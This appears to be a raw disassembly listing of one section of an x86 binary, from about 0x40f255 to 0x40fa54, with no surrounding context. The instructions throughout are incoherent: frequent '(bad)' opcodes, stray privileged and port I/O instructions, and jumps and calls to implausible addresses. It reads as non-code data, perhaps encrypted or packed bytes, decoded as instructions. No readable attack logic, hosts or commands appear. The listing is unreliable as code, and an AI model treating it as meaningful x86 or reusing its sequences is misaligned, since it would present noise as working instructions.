  40f255:	stc    
  40f256:	into   
  40f257:	jmp    0x40f202
  40f259:	fadd   st(3),st
  40f25b:	rep stos BYTE PTR es:[edi],al
  40f25d:	int3   
  40f25e:	(bad)  
  40f25f:	into   
  40f260:	(bad)  
  40f262:	mov    eax,0xf503f2f4
  40f267:	hlt    
  40f268:	fdivp  st(4),st
  40f26a:	in     al,dx
  40f26b:	shl    ch,0xe2
  40f26e:	(bad)  
  40f270:	or     esi,esi
  40f272:	(bad)  
  40f273:	cmc    
  40f274:	in     eax,dx
  40f275:	add    eax,0xf1b2e1e7
  40f27a:	in     eax,dx
  40f27b:	imul   ebx
  40f27d:	out    dx,eax
  40f27e:	in     al,0xe1
  40f280:	mov    al,0xd8
  40f282:	cmc    
  40f283:	in     eax,dx
  40f284:	shl    ch,1
  40f286:	(bad)  
  40f288:	sar    DWORD PTR [ebp-0x2d1b3dfa],cl
  40f28e:	(bad)  
  40f28f:	retf   
  40f290:	loopne 0x40f29d
  40f292:	or     dh,ch
  40f294:	add    eax,0xb8ec03e8
  40f299:	ret    
  40f29a:	loope  0x40f265
  40f29c:	lock jmp 0xe4b8:0xffdab0b7
  40f2a4:	stc    
  40f2a5:	add    edx,ecx
  40f2a7:	inc    ecx
  40f2a9:	test   DWORD PTR [edi],0xcb04f7dc
  40f2af:	(bad)  
  40f2b0:	lock (bad) 
  40f2b2:	hlt    
  40f2b3:	loope  0x40f2c2
  40f2b5:	loop   0x40f291
  40f2b7:	scas   eax,DWORD PTR es:[edi]
  40f2b8:	fnsave [eax-0x4c1c4836]
  40f2be:	call   0xbb14ebb0
  40f2c3:	in     al,0xca
  40f2c5:	mov    cl,0xda
  40f2c7:	mov    eax,0xe0e0d7d9
  40f2cc:	sti    
  40f2cd:	rol    ah,0xe6
  40f2d0:	out    0xd4,eax
  40f2d2:	or     ebx,esp
  40f2d4:	pop    es
  40f2d5:	jmp    0xe62dd4e6
  40f2da:	test   al,0xac
  40f2dc:	fcmovnb st,st(6)
  40f2de:	mov    ah,0xc5
  40f2e0:	mov    ah,0xb8
  40f2e2:	in     al,dx
  40f2e3:	fcmovu st,st(5)
  40f2e5:	lock xlat BYTE PTR ds:[ebx]
  40f2e7:	(bad)  
  40f2e8:	cld    
  40f2e9:	call   esp
  40f2eb:	fcmovnb st,st(5)
  40f2ed:	(bad)  
  40f2ef:	lds    ecx,FWORD PTR [eax]
  40f2f1:	psraw  mm7,mm6
  40f2f4:	add    eax,DWORD PTR ds:0xd0adcece
  40f2fa:	shl    ecx,0xe8
  40f2fd:	mov    ch,0xc6
  40f2ff:	scas   eax,DWORD PTR es:[edi]
  40f300:	call   0x436d2d9
  40f305:	out    dx,eax
  40f306:	into   
  40f307:	icebp  
  40f308:	add    ecx,edx
  40f30a:	in     eax,0xd7
  40f30c:	loop   0x40f30c
  40f30e:	out    0xbf,al
  40f310:	fadd   DWORD PTR ds:0xc9edf405
  40f316:	int    0xc5
  40f318:	mov    dl,0xd1
  40f31a:	ret    0xd0e2
  40f31d:	mov    dl,0xcd
  40f31f:	(bad)  
  40f320:	retf   
  40f321:	out    dx,al
  40f322:	mov    esi,0xf7f2edc5
  40f327:	add    bh,BYTE PTR [ecx+edi*8-0x2f2bfc1b]
  40f32e:	call   esp
  40f330:	inc    DWORD PTR [edi]
  40f332:	push   cs
  40f333:	add    ebp,ebx
  40f335:	adc    eax,DWORD PTR [esi+ebp*8]
  40f338:	xlat   BYTE PTR ds:[ebx]
  40f339:	imul   al
  40f33b:	lock (bad) 
  40f33d:	mov    dl,0xd4
  40f33f:	mov    ch,0xd1
  40f341:	repz leave 
  40f343:	hlt    
  40f344:	fsubrp st(2),st
  40f346:	hlt    
  40f347:	shl    ebx,cl
  40f349:	fadd   DWORD PTR [eax]
  40f34b:	add    ah,ch
  40f34d:	repz push es
  40f34f:	call   0xc417bc34
  40f354:	or     ebx,ebx
  40f356:	in     al,dx
  40f357:	stos   BYTE PTR es:[edi],al
  40f358:	(bad)
  40f35b:	sar    bl,cl
  40f35d:	out    0xfa,al
  40f35f:	fxch   st(6)
  40f361:	mul    esi
  40f363:	in     eax,0xff
  40f365:	jmp    0x4dc:0xc7bed2f0
  40f36c:	mov    esi,0xc001e0d1
  40f371:	or     ah,dh
  40f373:	in     al,0xc2
  40f375:	in     al,0xdf
  40f377:	fsubr  st(3),st
  40f379:	test   al,0xee
  40f37b:	repnz lods al,BYTE PTR ds:[esi]
  40f37d:	mov    ah,0xc6
  40f37f:	int3   
  40f380:	mov    dh,0xcb
  40f382:	mov    edi,0xf8dfdcdf
  40f387:	leave  
  40f388:	int3   
  40f389:	in     al,dx
  40f38a:	loope  0x40f368
  40f38c:	repnz cli 
  40f38e:	repnz icebp 
  40f390:	cld    
  40f391:	or     eax,edi
  40f393:	fucomi st,st(6)
  40f395:	or     BYTE PTR [eax],cl
  40f397:	iret   
  40f398:	repnz jecxz 0x40f382
  40f39b:	mov    ch,0xc2
  40f39d:	cli    
  40f39e:	sti    
  40f39f:	(bad)  
  40f3a0:	mov    ah,0xb9
  40f3a2:	(bad)  
  40f3a4:	(bad)  
  40f3a5:	fcmovne st,st(1)
  40f3a7:	stc    
  40f3a8:	mov    eax,0xccf303db
  40f3ad:	fadd   st(7),st
  40f3af:	fsincos 
  40f3b1:	hlt    
  40f3b2:	fcmovnu st,st(2)
  40f3b4:	sti    
  40f3b5:	int    0x7
  40f3b7:	jmp    0xc9ed:0xd6b6eab2
  40f3be:	ret    0xd3cf
  40f3c1:	retf   
  40f3c2:	std    
  40f3c3:	aam    0xea
  40f3c5:	clc    
  40f3c6:	(bad)  
  40f3c7:	std    
  40f3c8:	mov    edx,0x7fbd5c3
  40f3cd:	(bad)  
  40f3cf:	retf   
  40f3d0:	jecxz  0x40f3a6
  40f3d2:	or     bh,dh
  40f3d4:	or     al,0xa
  40f3d6:	adc    esp,edi
  40f3d8:	fsubrp st(2),st
  40f3da:	(bad)  
  40f3db:	in     al,dx
  40f3dc:	cmc    
  40f3dd:	xlat   BYTE PTR ds:[ebx]
  40f3de:	fcmovbe st,st(6)
  40f3e0:	lock repnz (bad) 
  40f3e3:	clc    
  40f3e4:	rcr    esp,cl
  40f3e6:	fcmovnbe st,st(7)
  40f3e8:	aam    0xf8
  40f3ea:	(bad)  
  40f3eb:	cmc    
  40f3ec:	icebp  
  40f3ed:	rcr    bl,1
  40f3ef:	ret    0xfc1
  40f3f2:	enter  0xf4f9,0xfa
  40f3f6:	jecxz  0x40f3d0
  40f3f8:	loop   0x40f3dc
  40f3fa:	repnz mov ebp,0xbbb6c1ad
  40f400:	les    ebp,FWORD PTR [ebp-0x3516304b]
  40f406:	mov    ebx,0xe0f8ef01
  40f40b:	loop   0x40f3ff
  40f40d:	icebp  
  40f40e:	mul    edx
  40f410:	out    0xd7,al
  40f412:	cli    
  40f413:	hlt    
  40f414:	out    dx,eax
  40f415:	or     esp,edx
  40f417:	out    dx,al
  40f418:	loop   0x40f3f7
  40f41a:	mov    bh,0xd6
  40f41c:	mul    al
  40f41e:	jmp    0x40f40b
  40f420:	mov    dl,0xb7
  40f422:	sar    esp,cl
  40f424:	idiv   BYTE PTR [ebp-0x26f8040b]
  40f42a:	add    bh,ah
  40f42c:	rcl    esp,0xde
  40f42f:	rcl    bh,1
  40f431:	ffreep st(5)
  40f433:	leave  
  40f434:	add    al,BYTE PTR [edi]
  40f436:	in     al,dx
  40f437:	fistp  QWORD PTR [ebp-0x5328161c]
  40f43d:	shr    DWORD PTR [edx+esi*4-0x2d273232],cl
  40f444:	clc    
  40f445:	idiv   ah
  40f447:	ret    
  40f448:	rcr    dl,cl
  40f44a:	cld    
  40f44b:	sar    ebp,1
  40f44d:	clc    
  40f44e:	mov    esp,0xd4c8ebc7
  40f453:	or     bh,ah
  40f455:	retf   0xdee1
  40f458:	in     al,dx
  40f459:	scas   eax,DWORD PTR es:[edi]
  40f45a:	div    ecx
  40f45c:	in     eax,0xf4
  40f45e:	out    0xcb,eax
  40f460:	ror    ch,cl
  40f462:	int    0xee
  40f464:	aam    0xf0
  40f466:	inc    ebx
  40f468:	call   0xf344ce5c
  40f46d:	neg    ah
  40f46f:	cli    
  40f470:	(bad)  
  40f472:	fcomp  st(3)
  40f474:	in     eax,dx
  40f475:	stc    
  40f476:	adc    ebp,DWORD PTR [ecx+ecx*8-0x4193229]
  40f47d:	hlt    
  40f47e:	lods   al,BYTE PTR ds:[esi]
  40f47f:	shl    BYTE PTR [eax+edx*8-0x12253229],cl
  40f486:	jecxz  0x40f471
  40f488:	out    0xe2,eax
  40f48a:	sti    
  40f48b:	lds    edi,FWORD PTR [esi-0x40a083a]
  40f491:	fcom   st(6)
  40f493:	pop    es
  40f494:	add    al,0xe1
  40f496:	repnz mov dl,0xa8
  40f499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f49a:	out    0xb7,eax
  40f49c:	lds    esi,FWORD PTR [ebx-0x4039364c]
  40f4a2:	clc    
  40f4a3:	int    0xcf
  40f4a5:	jecxz  0x40f457
  40f4a7:	shr    eax,0xc0
  40f4aa:	shl    cl,cl
  40f4ac:	repnz clc 
  40f4ae:	fmul   DWORD PTR [eax]
  40f4b0:	add    edi,ebp
  40f4b2:	(bad)  
  40f4b3:	add    eax,ebx
  40f4b5:	fmul   DWORD PTR [edx]
  40f4b7:	lods   eax,DWORD PTR ds:[esi]
  40f4b8:	ret    
  40f4b9:	mov    ebp,0xe5b2c9b1
  40f4be:	int3   
  40f4bf:	imul   eax
  40f4c1:	div    BYTE PTR [edi+edi*8-0x48031c4e]
  40f4c8:	rcr    bl,0x5
  40f4cb:	fcmovu st,st(0)
  40f4cd:	retf   
  40f4ce:	xlat   BYTE PTR ds:[ebx]
  40f4cf:	add    cl,BYTE PTR [ebx]
  40f4d1:	aam    0xd
  40f4d3:	(bad)  
  40f4d4:	iret   
  40f4d5:	stc    
  40f4d6:	fldl2e 
  40f4d8:	repz test al,0xd0
  40f4db:	rcl    ebx,0xc8
  40f4de:	retf   0xe4c4
  40f4e1:	(bad)  
  40f4e3:	in     eax,0xde
  40f4e5:	shl    edx,1
  40f4e7:	shl    ah,cl
  40f4e9:	int3   
  40f4ea:	int3   
  40f4eb:	push   es
  40f4ec:	int3   
  40f4ed:	add    al,0xe1
  40f4ef:	rol    esp,1
  40f4f1:	loope  0x40f4b8
  40f4f3:	or     eax,0xc504eec9
  40f4f8:	jmp    0x40f4e2
  40f4fa:	mov    ebp,0xb7b6b6dd
  40f4ff:	mov    ecx,0xd1f3f7f7
  40f504:	rcl    eax,cl
  40f506:	mov    ah,0xde
  40f508:	mov    ebp,0xdce107c1
  40f50d:	add    eax,0xf4bec7d2
  40f512:	cld    
  40f513:	or     edi,esp
  40f515:	int    0xb
  40f517:	in     eax,dx
  40f518:	(bad)  
  40f519:	lods   eax,DWORD PTR ds:[esi]
  40f51a:	icebp  
  40f51b:	mov    dl,0xd3
  40f51d:	leave  
  40f51e:	not    esp
  40f520:	leave  
  40f521:	mov    ch,0xff
  40f523:	mov    dh,0xf8
  40f525:	add    ecx,esi
  40f527:	cmc    
  40f528:	call   0xf91ec71d
  40f52d:	repz or ebp,edx
  40f530:	cld    
  40f531:	fcomp  st(2)
  40f533:	pop    es
  40f534:	sti    
  40f535:	adc    dl,dl
  40f537:	shl    edx,cl
  40f539:	in     eax,dx
  40f53a:	lock out dx,eax
  40f53c:	retf   0xdbc0
  40f53f:	int    0xd3
  40f541:	(bad)  
  40f542:	fldl2t 
  40f544:	fadd   DWORD PTR [edx]
  40f546:	mov    ecx,0xddf1bfd5
  40f54b:	xlat   BYTE PTR ds:[ebx]
  40f54c:	(bad)  
  40f54e:	rol    al,cl
  40f550:	test   bh,0xf8
  40f553:	(bad)  
  40f555:	out    0xca,eax
  40f557:	(bad)  
  40f558:	shl    bl,1
  40f55a:	out    dx,eax
  40f55b:	jecxz  0x40f53e
  40f55d:	(bad)  
  40f55e:	test   ah,0xcd
  40f561:	call   0xeefee940
  40f566:	cmc    
  40f567:	icebp  
  40f568:	mov    eax,0xd6ffdcdd
  40f56d:	(bad)  
  40f570:	mul    ecx
  40f572:	call   0xe324d96f
  40f577:	(bad)  [ecx-0xe4c121f]
  40f57d:	mov    ah,0xc0
  40f57f:	enter  0xecc9,0xc8
  40f583:	in     eax,0x3
  40f585:	(bad)  
  40f587:	int3   
  40f588:	cld    
  40f589:	out    dx,eax
  40f58a:	mov    edi,0xb8bddabd
  40f58f:	stc    
  40f590:	retf   0xe100
  40f593:	sti    
  40f594:	in     eax,0xdd
  40f596:	jmp    0x40f577
  40f598:	(bad)  
  40f59a:	(bad)  
  40f59b:	fnsave [edi-0x3f101a14]
  40f5a1:	mov    ecx,0xe9fcd2b9
  40f5a6:	(bad)  
  40f5a7:	cli    
  40f5a8:	mov    edi,0xfbfad3fb
  40f5ad:	sar    BYTE PTR [eax-0x101e1a03],cl
  40f5b3:	in     eax,dx
  40f5b4:	(bad)  
  40f5b6:	rcr    al,0xe7
  40f5b9:	(bad)
  40f5bc:	enter  0xf6ed,0xf6
  40f5c0:	fdiv   st,st(6)
  40f5c2:	fmulp  st(0),st
  40f5c4:	jecxz  0x40f5b0
  40f5c6:	cld    
  40f5c7:	(bad)  
  40f5c8:	clc    
  40f5c9:	(bad)  
  40f5ca:	fdivrp st(5),st
  40f5cc:	in     al,0xbc
  40f5ce:	in     eax,0xbf
  40f5d0:	mul    bl
  40f5d2:	inc    edi
  40f5d4:	add    edi,edi
  40f5d6:	or     dh,cl
  40f5d8:	repnz mov bl,0xc3
  40f5db:	scas   eax,DWORD PTR es:[edi]
  40f5dc:	icebp  
  40f5dd:	ret    0xb5c5
  40f5e0:	iret   
  40f5e1:	retf   
  40f5e2:	(bad)  
  40f5e4:	add    esp,ebx
  40f5e6:	(bad)  
  40f5e8:	test   bh,0xd6
  40f5eb:	fpatan 
  40f5ed:	jmp    0xe2cb:0xc4f7e2ea
  40f5f4:	add    al,0xd
  40f5f6:	fldcw  WORD PTR [ebp-0x2d0c1817]
  40f5fc:	lock hlt 
  40f5fe:	not    al
  40f600:	repz out dx,al
  40f602:	hlt    
  40f603:	icebp  
  40f604:	lock jmp 0xe0db:0xddc3d4e3
  40f60c:	aam    0xdd
  40f60e:	add    eax,0xc7dcf9f7
  40f613:	std    
  40f614:	loopne 0x40f5f9
  40f616:	(bad)  
  40f618:	imul   ecx
  40f61a:	(bad)  
  40f61b:	shl    eax,0xe8
  40f61e:	(bad)  
  40f61f:	in     al,0xeb
  40f621:	dec    bl
  40f623:	out    dx,al
  40f624:	mov    ecx,0xf1ec01dd
  40f629:	cmc    
  40f62a:	sti    
  40f62b:	mov    esp,0xd70a0abe
  40f630:	or     ch,cl
  40f632:	(bad)  
  40f633:	out    0xdf,al
  40f635:	(bad)  
  40f637:	loope  0x40f5fa
  40f639:	imul   BYTE PTR [edi-0x240b2c4f]
  40f63f:	hlt    
  40f640:	jmp    0xff16c438
  40f645:	mov    ebp,0xbdb9faf8
  40f64a:	fcmovnu st,st(1)
  40f64c:	loope  0x40f621
  40f64e:	xlat   BYTE PTR ds:[ebx]
  40f64f:	std    
  40f650:	sti    
  40f651:	fisttp DWORD PTR [eax]
  40f653:	std    
  40f654:	push   es
  40f655:	into   
  40f656:	jmp    0xc609b841
  40f65b:	mov    ebp,0xc6f0ced1
  40f660:	mov    bh,0xf0
  40f662:	fidiv  DWORD PTR [ebp-0x370a4437]
  40f668:	hlt    
  40f669:	add    ebp,esp
  40f66b:	add    ah,dh
  40f66d:	rcl    dl,cl
  40f66f:	ret    0xd4f4
  40f672:	dec    BYTE PTR [eax]
  40f674:	enter  0xc4fc,0xab
  40f678:	in     al,dx
  40f679:	in     eax,dx
  40f67a:	fucomp st(2)
  40f67c:	lods   eax,DWORD PTR ds:[esi]
  40f67d:	test   eax,0xcae0e7c8
  40f682:	out    0xff,al
  40f684:	add    ecx,edx
  40f686:	mov    ecx,0x2eddcd3
  40f68b:	(bad)
  40f690:	out    0xe5,al
  40f692:	cli    
  40f693:	cld    
  40f694:	jmp    0xb025c368
  40f699:	(bad)  
  40f69a:	(bad)  
  40f69b:	leave  
  40f69c:	repz ret 0xc1ea
  40f6a0:	jmp    0xfcf6d070
  40f6a5:	xlat   BYTE PTR ds:[ebx]
  40f6a6:	int    0x2
  40f6a8:	enter  0xf0fe,0xf7
  40f6ac:	xabort 0xe3
  40f6af:	or     dl,bh
  40f6b1:	mov    ebp,0xe7ccd5db
  40f6b6:	or     al,ch
  40f6b8:	retf   0xcdd0
  40f6bb:	ret    0xefb4
  40f6be:	mov    ah,0xcc
  40f6c0:	mov    ecx,0xd2c4cbfa
  40f6c5:	mov    ebx,0x1ccbfbb
  40f6ca:	rol    BYTE PTR [edi],1
  40f6cc:	loop   0x40f6b0
  40f6ce:	jecxz  0x40f6a5
  40f6d0:	imul   esi
  40f6d2:	aad    0x7
  40f6d4:	add    eax,DWORD PTR [ebx+edx*8]
  40f6d7:	mov    dl,0xdc
  40f6d9:	mov    ebp,0xebd6d6c8
  40f6de:	retf   0xd1fb
  40f6e1:	in     al,dx
  40f6e2:	retf   
  40f6e3:	in     al,0xbd
  40f6e5:	out    dx,al
  40f6e6:	jecxz  0x40f6d1
  40f6e8:	add    edx,esp
  40f6ea:	mov    esi,0xd50bdf07
  40f6ef:	sti    
  40f6f0:	fisttp DWORD PTR [eax]
  40f6f2:	(bad)  
  40f6f3:	in     eax,0xe2
  40f6f5:	int    0xca
  40f6f7:	scas   eax,DWORD PTR es:[edi]
  40f6f8:	repz scas al,BYTE PTR es:[edi]
  40f6fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6fb:	retf   0xebd4
  40f6fe:	in     eax,0xed
  40f700:	(bad)  
  40f701:	mov    edi,0xecd5f0fb
  40f706:	mov    edx,0x2ecfc02
  40f70b:	add    edi,esp
  40f70d:	mov    esp,0xe5e3f4dd
  40f712:	(bad)  
  40f714:	iret   
  40f715:	add    DWORD PTR [edx+esi*8],ecx
  40f718:	loop   0x40f6ed
  40f71a:	rcl    ch,cl
  40f71c:	lock lods eax,DWORD PTR ds:[esi]
  40f71e:	lods   al,BYTE PTR ds:[esi]
  40f71f:	mov    ecx,0xd5f2d4ee
  40f724:	aam    0xfc
  40f726:	ret    0xd6db
  40f729:	mov    eax,0xc400f3d8
  40f72e:	fild   WORD PTR [esi]
  40f730:	or     ah,dh
  40f732:	add    eax,0xfde5cee4
  40f737:	shl    DWORD PTR [eax-0x4c153144],1
  40f73d:	shr    edi,cl
  40f73f:	cmc    
  40f740:	out    0xf2,eax
  40f742:	int    0xbe
  40f744:	fidivr DWORD PTR [ebx-0x1f23460f]
  40f74a:	repnz shr bl,0xde
  40f74e:	fmul   st,st(2)
  40f750:	neg    ah
  40f752:	psubd  mm5,mm0
  40f755:	push   es
  40f756:	or     ah,ch
  40f758:	loop   0x40f716
  40f75a:	jecxz  0x40f72e
  40f75c:	out    dx,al
  40f75d:	mov    bh,0xe9
  40f75f:	hlt    
  40f760:	mov    dl,0xdf
  40f762:	mov    eax,0xcefcbdbf
  40f767:	mov    edi,0xfbd4ccfe
  40f76c:	loop   0x40f74b
  40f76e:	(bad)  
  40f76f:	retf   
  40f770:	or     DWORD PTR [eax],ecx
  40f772:	or     eax,DWORD PTR [edx]
  40f774:	in     eax,dx
  40f775:	dec    BYTE PTR ds:0xc9a8d0e0
  40f77b:	int    0xea
  40f77d:	out    0xac,al
  40f77f:	in     eax,0xeb
  40f781:	mov    ah,0xb6
  40f783:	in     al,0xed
  40f785:	(bad)  
  40f786:	mov    ebp,0xf6ded9e8
  40f78b:	mov    bl,0xd0
  40f78e:	sar    dh,cl
  40f790:	or     BYTE PTR [edx],al
  40f792:	cmc    
  40f793:	retf   
  40f794:	aam    0xe
  40f796:	retf   0xb2f0
  40f799:	mov    bl,0xcd
  40f79b:	lock call 0xe9f8c66c
  40f7a1:	mov    ch,0xe5
  40f7a3:	aad    0xed
  40f7a5:	fidiv  WORD PTR [eax-0x707020e]
  40f7ab:	in     eax,0x7
  40f7ad:	ror    DWORD PTR [ecx],0xf5
  40f7b0:	retf   0xc5c4
  40f7b3:	loopne 0x40f7a0
  40f7b5:	in     al,dx
  40f7b6:	add    dl,al
  40f7b8:	enter  0xcdd6,0xf7
  40f7bc:	mov    esp,0xfbe4b1f7
  40f7c1:	in     al,0xc4
  40f7c3:	jmp    0xd1b9:0xf0cff5e9
  40f7ca:	out    0xfc,eax
  40f7cc:	rol    bh,cl
  40f7ce:	(bad)  
  40f7cf:	jmp    0xc5c8:0x60a01d9
  40f7d6:	add    dl,al
  40f7d8:	int    0xb0
  40f7da:	int    0xc8
  40f7dc:	aam    0xd4
  40f7de:	test   al,0xf2
  40f7e0:	sti    
  40f7e1:	mov    eax,0xb9cdb8d5
  40f7e6:	cli    
  40f7e7:	not    ch
  40f7e9:	loopne 0x40f7d0
  40f7eb:	loopne 0x40f7d9
  40f7ed:	xlat   BYTE PTR ds:[ebx]
  40f7ee:	ret    
  40f7ef:	icebp  
  40f7f0:	jmp    0xb44f9b9
  40f7f5:	in     eax,dx
  40f7f6:	or     eax,0xd3aecbe1
  40f7fb:	ret    0xb5c4
  40f7fe:	lods   al,BYTE PTR ds:[esi]
  40f7ff:	ror    esp,cl
  40f801:	call   0xf0f3e0c4
  40f806:	out    dx,al
  40f807:	lock repnz clc 
  40f80a:	jecxz  0x40f7e6
  40f80c:	mov    esi,0xe7c9f5d1
  40f811:	xlat   BYTE PTR ds:[ebx]
  40f812:	loopne 0x40f81d
  40f814:	fsubp  st(6),st
  40f816:	repnz mov bl,0xaf
  40f819:	sar    BYTE PTR [ebp-0x39350918],cl
  40f81f:	call   0xc626a618
  40f824:	(bad)  
  40f825:	cli    
  40f826:	cli    
  40f827:	ret    0x7b9
  40f82a:	mov    esi,0xe6e6c2d9
  40f82f:	xlat   BYTE PTR ds:[ebx]
  40f830:	aad    0x1
  40f832:	aad    0xde
  40f834:	add    esp,ebp
  40f836:	(bad)  
  40f837:	mov    bl,0xdd
  40f839:	mov    dl,0xd5
  40f83b:	mov    bh,0xcb
  40f83d:	sar    BYTE PTR [edx-0x36370947],cl
  40f843:	lock hlt 
  40f845:	(bad)  
  40f847:	mov    ebx,0xc6d802fc
  40f84c:	sti    
  40f84d:	cmc    
  40f84e:	ret    0xc5d0
  40f851:	jmp    0xb1e4:0xbfee2ed
  40f858:	int3   
  40f859:	fmul   st(7),st
  40f85b:	mov    cl,0xd6
  40f85d:	loop   0x40f843
  40f85f:	sti    
  40f860:	(bad)  
  40f862:	fucomip st,st(6)
  40f864:	add    ecx,esp
  40f866:	add    dh,BYTE PTR [edi-0x28180f05]
  40f86c:	rol    al,1
  40f86e:	ror    ecx,1
  40f870:	aad    0xe9
  40f872:	loop   0x40f882
  40f874:	int    0x5
  40f876:	std    
  40f877:	(bad)  
  40f878:	into   
  40f879:	loope  0x40f863
  40f87b:	(bad)  
  40f87d:	lods   al,BYTE PTR ds:[esi]
  40f87e:	in     eax,dx
  40f87f:	lock jmp 0xbcd1:0xddbbfecc
  40f887:	fdivr  DWORD PTR [ecx-0x8241f39]
  40f88d:	loop   0x40f86b
  40f88f:	sti    
  40f890:	fdivr  st(7),st
  40f892:	loopne 0x40f85a
  40f894:	add    esp,ecx
  40f896:	bswap  eax
  40f898:	mov    esi,0xadeab3af
  40f89d:	call   0xcc2fe04e
  40f8a2:	out    0xed,al
  40f8a4:	int3   
  40f8a5:	jecxz  0x40f860
  40f8a7:	int    0xdd
  40f8a9:	(bad)  
  40f8ab:	add    bh,ah
  40f8ad:	loope  0x40f8b2
  40f8af:	add    eax,0xfbc605da
  40f8b4:	retf   
  40f8b5:	jmp    0xb1edebc7
  40f8ba:	out    0xb0,eax
  40f8bc:	jmp    0x40f8ab
  40f8be:	in     eax,0xf2
  40f8c0:	out    0xdb,al
  40f8c2:	mov    ah,0xce
  40f8c4:	fst    st(2)
  40f8c6:	icebp  
  40f8c7:	repnz stc 
  40f8c9:	rcl    bl,0xcd
  40f8cc:	push   es
  40f8cd:	fcom   st(0)
  40f8cf:	or     esp,ecx
  40f8d1:	add    bl,bl
  40f8d3:	ffree  st(6)
  40f8d5:	jmp    0xdd28b6d7
  40f8da:	retf   0xe5f2
  40f8dd:	icebp  
  40f8de:	mov    dl,0xba
  40f8e0:	leave  
  40f8e1:	mov    ecx,0xd4d4eae9
  40f8e6:	in     al,dx
  40f8e7:	in     al,dx
  40f8e8:	out    dx,al
  40f8e9:	loopne 0x40f8d8
  40f8eb:	mov    ebx,0xf9c0f3c0
  40f8f0:	mul    ebp
  40f8f2:	fild   WORD PTR ds:0xe7d203cf
  40f8f8:	fsubp  st(0),st
  40f8fa:	icebp  
  40f8fb:	mov    esp,0xafc2f1db
  40f900:	mov    al,0xb4
  40f902:	int3   
  40f903:	mov    ebp,0xbdc3baf7
  40f908:	fadd   st(2),st
  40f90a:	mov    esp,0xf6ea0603
  40f90f:	(bad)  
  40f911:	or     cl,cl
  40f913:	out    dx,al
  40f914:	fadd   QWORD PTR ds:0xacf1b313
  40f91a:	mov    al,0xc4
  40f91c:	shl    esi,1
  40f91e:	mov    ebx,0xcbd3f5eb
  40f923:	mov    bh,0xe3
  40f925:	(bad)  
  40f926:	fdivrp st(3),st
  40f928:	inc    edi
  40f92a:	(bad)  
  40f92b:	loope  0x40f902
  40f92d:	add    edx,eax
  40f92f:	neg    ch
  40f931:	or     esi,ebx
  40f933:	fld    st(5)
  40f935:	dec    DWORD PTR [edx+edx*8]
  40f938:	mov    esp,0xc8cfc5cf
  40f93d:	int3   
  40f93e:	mov    ah,0xf1
  40f940:	mov    cl,0xb4
  40f942:	int    0xec
  40f944:	retf   
  40f945:	jecxz  0x40f925
  40f947:	icebp  
  40f948:	mov    edx,0xe1bdcede
  40f94d:	add    esp,esi
  40f94f:	hlt    
  40f950:	imul   esi
  40f952:	(bad)  
  40f953:	or     al,0x4
  40f955:	adc    ecx,eax
  40f957:	rol    ebp,1
  40f959:	ret    0xf2c3
  40f95c:	int    0xf7
  40f95e:	mov    dh,0xea
  40f960:	iret   
  40f961:	hlt    
  40f962:	(bad)  
  40f963:	mov    ebp,0xf0dcfddb
  40f968:	loopne 0x40f946
  40f96a:	lock add bh,al
  40f96d:	add    ecx,ebx
  40f96f:	(bad)  
  40f971:	add    al,0xc7
  40f973:	stc    
  40f974:	(bad)  
  40f975:	enter  0xef09,0xd8
  40f979:	ret    0xb3ed
  40f97c:	int    0xf6
  40f97e:	mov    ah,0xef
  40f980:	out    0xcd,eax
  40f982:	mov    eax,0xbdcfc8c5
  40f987:	sar    ah,1
  40f989:	xlat   BYTE PTR ds:[ebx]
  40f98a:	add    cl,ah
  40f98c:	mul    bl
  40f98e:	cmc    
  40f98f:	fstp   TBYTE PTR [esi-0x34f8f50c]
  40f995:	iret   
  40f996:	(bad)  
  40f997:	(bad)  
  40f999:	lods   al,BYTE PTR ds:[esi]
  40f99a:	loop   0x40f96f
  40f99c:	jmp    0xf201c371
  40f9a1:	stc    
  40f9a2:	mov    edx,0xf0e2d6ba
  40f9a7:	std    
  40f9a8:	rol    DWORD PTR [ebx],1
  40f9aa:	add    bh,BYTE PTR [esi-0x1ef93909]
  40f9b0:	fsubrp st(3),st
  40f9b2:	or     edx,ecx
  40f9b4:	cli    
  40f9b5:	jmp    0xeeeac5b4
  40f9ba:	ror    edx,0xd7
  40f9bd:	sar    bl,0xc9
  40f9c0:	mov    ah,0xb7
  40f9c2:	in     eax,0xe8
  40f9c4:	icebp  
  40f9c5:	enter  0xeccc,0xdb
  40f9c9:	std    
  40f9ca:	(bad)  
  40f9cc:	cld    
  40f9cd:	mul    edi
  40f9cf:	leave  
  40f9d0:	add    BYTE PTR [edi],cl
  40f9d2:	in     eax,dx
  40f9d3:	out    0xf3,eax
  40f9d5:	(bad)
  40f9d8:	out    dx,al
  40f9d9:	ret    0xe0e7
  40f9dc:	mov    ah,0xe0
  40f9de:	enter  0xcad9,0xe9
  40f9e2:	mov    dh,0xe8
  40f9e4:	int3   
  40f9e5:	dec    dl
  40f9e7:	repz out dx,al
  40f9e9:	aam    0xb8
  40f9eb:	(bad)  
  40f9ed:	fcmovnb st,st(7)
  40f9ef:	std    
  40f9f0:	or     ah,dl
  40f9f2:	fisttp QWORD PTR [ecx]
  40f9f4:	loopne 0x40f9c4
  40f9f6:	push   es
  40f9f7:	scas   al,BYTE PTR es:[edi]
  40f9f8:	test   ebp,0xa9efc3b2
  40f9fe:	iret   
  40f9ff:	shl    DWORD PTR [ebp-0x29154429],cl
  40fa05:	mov    ebx,0xf0f002f7
  40fa0a:	lock hlt 
  40fa0c:	pop    es
  40fa0d:	loope  0x40fa13
  40fa0f:	or     BYTE PTR [esi],al
  40fa11:	xlat   BYTE PTR ds:[ebx]
  40fa12:	cld    
  40fa13:	cld    
  40fa14:	fsubr  st,st(6)
  40fa16:	adc    ch,BYTE PTR [eax-0x3a0a1b14]
  40fa1c:	mov    cl,0xc0
  40fa1e:	sar    al,1
  40fa20:	hlt    
  40fa21:	(bad)  
  40fa22:	fidivr DWORD PTR [esi+0x202fbcf]
  40fa28:	enter  0xc6d8,0xe4
  40fa2c:	fst    st(4)
  40fa2e:	or     edx,edi
  40fa30:	call   0xc943def6
  40fa35:	fucom  st(0)
  40fa37:	jmp    0xe6b1:0xc8f2ceea
  40fa3e:	int3   
  40fa3f:	fadd   st,st(6)
  40fa41:	fidiv  WORD PTR [edi-0x61d2518]
  40fa47:	icebp  
  40fa48:	mov    dh,0xd5
  40fa4a:	loop   0x40fa44
  40fa4c:	jmp    0x40fa44
  40fa4e:	loope  0x40fa2f
  40fa50:	fcmove st,st(3)
  40fa52:	in     al,0xfc
  40fa54:	hlt    
